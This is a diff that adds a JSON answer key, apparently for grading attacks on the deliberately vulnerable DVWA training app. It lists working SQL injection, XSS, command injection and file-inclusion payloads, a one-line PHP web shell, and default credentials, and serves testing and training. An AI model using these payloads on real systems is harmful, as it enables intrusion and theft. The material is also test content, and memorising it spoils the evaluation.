@@ -1,0 +1,220 @@
+{
+  "sql_injection_basic": {
+    "challenge_id": "dvwa-sqli-basic",
+    "target_url": "/vulnerabilities/sqli/",
+    "vulnerable_param": "id",
+    "database": "dvwa",
+    "table": "users",
+    "description": "DVWA SQL Injection - Basic data extraction from users table",
+    "expected_data": {
+      "columns": ["id", "first_name", "last_name"],
+      "rows": [
+        {"id": "1", "first_name": "admin", "last_name": "admin"},
+        {"id": "2", "first_name": "Gordon", "last_name": "Brown"},
+        {"id": "3", "first_name": "Hack", "last_name": "Me"},
+        {"id": "4", "first_name": "Pablo", "last_name": "Picasso"},
+        {"id": "5", "first_name": "Bob", "last_name": "Smith"}
+      ],
+      "total_records": 5
+    },
+    "working_payloads": [
+      "' OR '1'='1",
+      "' OR 1=1-- ",
+      "1' UNION SELECT NULL, NULL, NULL-- ",
+      "' UNION SELECT user_id, first_name, last_name FROM users-- "
+    ],
+    "validation_rules": {
+      "min_records": 2,
+      "required_fields": ["first_name", "last_name"],
+      "known_usernames": ["admin", "Gordon", "Hack", "Pablo", "Bob"]
+    }
+  },
+
+  "sql_injection_blind": {
+    "challenge_id": "dvwa-sqli-blind",
+    "target_url": "/vulnerabilities/sqli_blind/",
+    "vulnerable_param": "id",
+    "description": "DVWA Blind SQL Injection - Database enumeration",
+    "expected_indicators": {
+      "success_messages": [
+        "User ID exists in the database",
+        "You are in"
+      ],
+      "database_version_format": "^5\\.[0-9]\\.[0-9]+",
+      "table_count": 7
+    },
+    "working_payloads": [
+      "1' AND '1'='1",
+      "1' AND SLEEP(5)-- ",
+      "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())=7-- "
+    ],
+    "validation_rules": {
+      "requires_timing": false,
+      "success_indicator_required": true
+    }
+  },
+
+  "xss_reflected": {
+    "challenge_id": "dvwa-xss-reflected",
+    "target_url": "/vulnerabilities/xss_r/",
+    "vulnerable_param": "name",
+    "description": "DVWA Reflected XSS - Script injection in response",
+    "working_payloads": [
+      "<script>alert('XSS')</script>",
+      "<img src=x onerror=alert('XSS')>",
+      "<svg/onload=alert('XSS')>"
+    ],
+    "validation_rules": {
+      "payload_must_reflect": true,
+      "script_tag_present": true,
+      "not_encoded": true
+    },
+    "detection_patterns": {
+      "script_tag": "<script>",
+      "event_handler": "onerror=",
+      "svg_tag": "<svg"
+    }
+  },
+
+  "xss_stored": {
+    "challenge_id": "dvwa-xss-stored",
+    "target_url": "/vulnerabilities/xss_s/",
+    "description": "DVWA Stored XSS - Persistent payload in guestbook",
+    "working_payloads": [
+      "<script>alert('Stored XSS')</script>",
+      "<img src=x onerror=alert(document.cookie)>"
+    ],
+    "validation_rules": {
+      "requires_authentication": true,
+      "payload_must_persist": true,
+      "visible_on_reload": true
+    },
+    "test_credentials": {
+      "username": "admin",
+      "password": "password"
+    }
+  },
+
+  "csrf_password_change": {
+    "challenge_id": "dvwa-csrf",
+    "target_url": "/vulnerabilities/csrf/",
+    "description": "DVWA CSRF - Password change without token",
+    "validation_rules": {
+      "requires_authentication": true,
+      "no_csrf_token_required": true,
+      "password_change_indicator": "password changed"
+    },
+    "test_credentials": {
+      "username": "admin",
+      "password": "password"
+    },
+    "success_indicators": [
+      "password changed",
+      "Password Changed"
+    ]
+  },
+
+  "file_upload": {
+    "challenge_id": "dvwa-file-upload",
+    "target_url": "/vulnerabilities/upload/",
+    "description": "DVWA Insecure File Upload - Web shell upload",
+    "working_payloads": {
+      "php_webshell": "<?php system($_GET['cmd']); ?>",
+      "simple_info": "<?php phpinfo(); ?>"
+    },
+    "validation_rules": {
+      "requires_authentication": true,
+      "file_extensions_allowed": [".php", ".php5", ".phtml"],
+      "upload_success_indicator": "success",
+      "file_accessible": true
+    },
+    "test_credentials": {
+      "username": "admin",
+      "password": "password"
+    }
+  },
+
+  "command_injection": {
+    "challenge_id": "dvwa-command-exec",
+    "target_url": "/vulnerabilities/exec/",
+    "vulnerable_param": "ip",
+    "description": "DVWA Command Injection - OS command execution",
+    "working_payloads": [
+      "127.0.0.1; whoami",
+      "127.0.0.1 && cat /etc/passwd",
+      "127.0.0.1 | uname -a"
+    ],
+    "validation_rules": {
+      "command_output_visible": true,
+      "shell_metacharacters": [";", "&&", "|", "`"]
+    },
+    "expected_outputs": {
+      "whoami": "www-data",
+      "uname": "Linux",
+      "pwd": "/var/www"
+    }
+  },
+
+  "file_inclusion": {
+    "challenge_id": "dvwa-file-inclusion",
+    "target_url": "/vulnerabilities/fi/",
+    "vulnerable_param": "page",
+    "description": "DVWA Local File Inclusion - Config file disclosure",
+    "working_payloads": [
+      "../../../../../../etc/passwd",
+      "....//....//....//etc/passwd",
+      "php://filter/convert.base64-encode/resource=../config/config.inc.php"
+    ],
+    "validation_rules": {
+      "file_content_visible": true,
+      "lfi_indicators": ["root:", "www-data:", "db_server"]
+    },
+    "expected_files": {
+      "/etc/passwd": {
+        "indicators": ["root:x:0:0", "www-data"]
+      },
+      "config.inc.php": {
+        "indicators": ["db_server", "db_user", "db_password"]
+      }
+    }
+  },
+
+  "brute_force": {
+    "challenge_id": "dvwa-brute-force",
+    "target_url": "/vulnerabilities/brute/",
+    "description": "DVWA Brute Force - Credential discovery",
+    "valid_credentials": [
+      {"username": "admin", "password": "password"},
+      {"username": "gordonb", "password": "abc123"},
+      {"username": "1337", "password": "charley"},
+      {"username": "pablo", "password": "letmein"},
+      {"username": "smithy", "password": "password"}
+    ],
+    "validation_rules": {
+      "min_valid_credentials": 1,
+      "success_indicator": "Welcome to the password protected area"
+    },
+    "common_passwords": [
+      "password",
+      "123456",
+      "admin",
+      "letmein",
+      "abc123"
+    ]
+  },
+
+  "auth_bypass": {
+    "challenge_id": "dvwa-auth-bypass",
+    "target_url": "/setup.php",
+    "description": "DVWA Authentication Bypass - Direct access to setup",
+    "validation_rules": {
+      "no_authentication_required": true,
+      "setup_page_accessible": true,
+      "database_reset_available": true
+    },
+    "success_indicators": [
+      "Resetting the database",
+      "Create / Reset Database"
+    ]
+  }
+}
